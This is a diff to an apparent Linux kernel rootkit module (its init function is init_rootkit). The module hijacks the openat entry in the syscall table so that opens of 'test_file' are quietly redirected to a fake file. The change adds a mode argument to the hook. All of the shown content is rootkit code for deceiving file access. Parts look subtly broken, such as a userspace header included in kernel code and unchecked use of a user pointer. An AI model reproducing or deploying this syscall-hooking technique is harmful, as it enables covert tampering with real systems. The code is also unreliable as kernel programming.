@@ -13,6 +13,7 @@
 #include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
+#include <sys/types.h>
 
 static unsigned long *sys_call_table;
 static unsigned long orig_sys_call_table[__NR_syscalls] = { 0 };
@@ -63,20 +64,21 @@ static void unhook_all(void)
     protect_memory();
 }
 
-asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int flags) 
+asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int flags, mode_t mode) 
 { 
-    asmlinkage int (*orig)(int, const char __user *, int);
-    orig = (asmlinkage int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);
+    asmlinkage int (*orig)(int, const char __user *, int, mode_t);
+    orig = (asmlinkage int (*)(int, const char __user *, int, mode_t))
+        (sys_call_table[__NR_openat]);
 
     const char * orig_file = "test_file";
     const char * fake_file = "./test_file_fake";
 
     if (strstr(pathname, orig_file))
     {
-        return orig(dirfd, fake_file, flags);
+        return orig(dirfd, fake_file, flags, mode);
     }    
  
-    return orig(dirfd, pathname, flags);
+    return orig(dirfd, pathname, flags, mode);
 }
 
 static int __init init_rootkit(void)
